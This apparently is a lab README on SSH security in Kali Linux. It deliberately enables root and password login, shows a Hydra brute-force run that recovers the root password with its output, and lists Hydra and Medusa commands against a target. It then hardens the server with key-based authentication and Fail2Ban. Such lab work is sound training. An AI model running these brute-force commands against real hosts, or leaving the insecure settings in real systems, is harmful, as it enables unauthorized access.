# POC-TASKS
# 📌 Linux Security - Exploitation & Hardening (PoC)

This repository demonstrates **Remote Access (SSH) misconfigurations**, including **exploitation and mitigation**.

---

## 🔹 **Task 2: Remote Access & SSH Hardening**  

### ✅ **Setup: Enabling SSH & Allowing Root Login**  

```bash
# Update package list and install OpenSSH server
┌──(kali㉿kali)-[~]
└─$ sudo apt update && sudo apt install openssh-server -y

# Enable SSH to start on boot
┌──(kali㉿kali)-[~]
└─$ sudo systemctl enable --now ssh

# Verify SSH is running
┌──(kali㉿kali)-[~]
└─$ sudo systemctl status ssh

● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: disa>
     Active: active (running) since Mon 2025-03-17 18:57:38 IST; 2h 1min ago
     -----

# Allow root login (INSECURE!)
┌──(kali㉿kali)-[~]
└─$ sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Enable password-based authentication (INSECURE!)
┌──(kali㉿kali)-[~]
└─$ sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH to apply changes
┌──(kali㉿kali)-[~]
└─$ sudo systemctl restart ssh

# Verify SSH is listening on port 22
┌──(kali㉿kali)-[~]
└─$ ss -tlnp | grep ssh
```

---

### ✅ **Exploitation: Brute-Force Attack on SSH**  

```bash
# Install Hydra (Brute-force tool)
┌──(kali㉿kali)-[~]
└─$ sudo apt install -y hydra

# Run Hydra brute-force attack on SSH
┌──(kali㉿kali)-[~]
└─$ hydra -l root -P passwords.txt ssh://178.0.0.9 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-17 21:50:56
[DATA] max 4 tasks per 1 server, overall 4 tasks, 5 login tries (l:1/p:5), ~2 tries per task
[DATA] attacking ssh://178.0.09:22/
[22][ssh] host: 178.0.0.9   login: root   password: *****
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-17 21:50:59
```

---

### ✅ **Mitigation: Hardening SSH Security**  

```bash
# Disable root login for SSH (SECURE)
┌──(kali㉿kali)-[~]
└─$ sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# Enable key-based authentication
┌──(kali㉿kali)-[~]
└─$ mkdir -p ~/.ssh && chmod 700 ~/.ssh

# Generate SSH key pair
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -t rsa -b 4096

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:*********************************** kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|  .=o+*+=B*= .   |
|  ..O=.+*B=.o    |
|   =.oo .E=  .   |
|    .  ..o. . .  |
|        S  . + . |
|            = ...|
|           o oo o|
|            . .+ |
|             ..  |
+----[SHA256]-----+


# Copy public key to authorized keys
┌──(kali㉿kali)-[~]
└─$ ssh-copy-id root@127.0.0.1
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: ssh-add -L
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
root@127.0.0.1's password: **********

Number of key(s) added: 1

Now try logging into the machine, with: "ssh 'root@178.0.0.9'"
and check to make sure that only the key(s) you wanted were added.

# Disable password authentication (SECURE)
┌──(kali㉿kali)-[~]
└─$ sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# Restart SSH to apply changes
┌──(kali㉿kali)-[~]
└─$ sudo systemctl restart ssh
```

---

### ✅ **Mitigation: Prevent Brute-Force Attacks with Fail2Ban**  

```bash
# Install Fail2Ban
┌──(kali㉿kali)-[~]
└─$ sudo apt install -y fail2ban

# Enable and start Fail2Ban
┌──(kali㉿kali)-[~]
└─$ sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Configure Fail2Ban for SSH protection
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/fail2ban/jail.local

# Add this inside nano
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 600


# Restart Fail2Ban to apply settings
┌──(kali㉿kali)-[~]
└─$ sudo systemctl restart fail2ban

# Check Fail2Ban status for SSH
                                                                                                                                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo fail2ban-client status sshd

Status for the jail: sshd
|- Filter
|  |- Currently failed:	0
|  |- Total failed:	0
|  `- Journal matches:	_SYSTEMD_UNIT=ssh.service + _COMM=sshd
`- Actions
   |- Currently banned:	0
   |- Total banned:	0
   `- Banned IP list:

# Login in Root
┌──(kali㉿kali)-[~]
└─$ ssh root@178.0.0.9

Linux kali 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 17 21:47:25 2025 from 178.0.0.9

┌──(root㉿kali)-[~]
└─# 
```
## 📌 Task 2 - Summary  

| **Step**              | **Action**                                         | **Command**                                  |
|----------------------|-------------------------------------------------|---------------------------------------------|
| 🔹 **Setup**          | Install & start SSH                              | `sudo apt update && sudo apt install -y openssh-server`<br>`sudo systemctl enable ssh`<br>`sudo systemctl start ssh` |
|                      | Allow root login (INSECURE)                      | `sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config` |
|                      | Enable password authentication (INSECURE)        | `sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config` |
|                      | Restart SSH to apply changes                     | `sudo systemctl restart ssh` |
|                      | Verify SSH is running                            | `sudo systemctl status ssh` |
|                      | Check if SSH is listening                        | `ss -tlnp | grep ssh` |
| 🔹 **Exploitation**   | Install Hydra                                   | `sudo apt install -y hydra` |
|                      | Perform brute-force attack using Hydra          | `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4` |
|                      | Install Medusa                                   | `sudo apt install -y medusa` |
|                      | Perform brute-force attack using Medusa         | `medusa -h <target-ip> -u root -P /usr/share/wordlists/rockyou.txt -M ssh -n 22` |
| 🔹 **Mitigation**     | Disable root login (SECURE)                     | `sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config` |
|                      | Enable key-based authentication                 | `mkdir -p ~/.ssh && chmod 700 ~/.ssh`<br>`ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""`<br>`cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys`<br>`chmod 600 ~/.ssh/authorized_keys` |
|                      | Disable password authentication (SECURE)        | `sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config` |
|                      | Restart SSH to apply changes                     | `sudo systemctl restart ssh` |
| 🔹 **Prevent Brute-Force** | Install Fail2Ban                        | `sudo apt install -y fail2ban` |
|                      | Enable & start Fail2Ban                          | `sudo systemctl enable fail2ban`<br>`sudo systemctl start fail2ban` |
|                      | Configure Fail2Ban for SSH                        | `echo -e "[sshd]\nenabled = true\nport = ssh\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 5\nbantime = 600" | sudo tee /etc/fail2ban/jail.local` |
|                      | Restart Fail2Ban                                  | `sudo systemctl restart fail2ban` |
|                      | Check Fail2Ban SSH protection                     | `sudo fail2ban-client status sshd` |

---
 ### END -x-
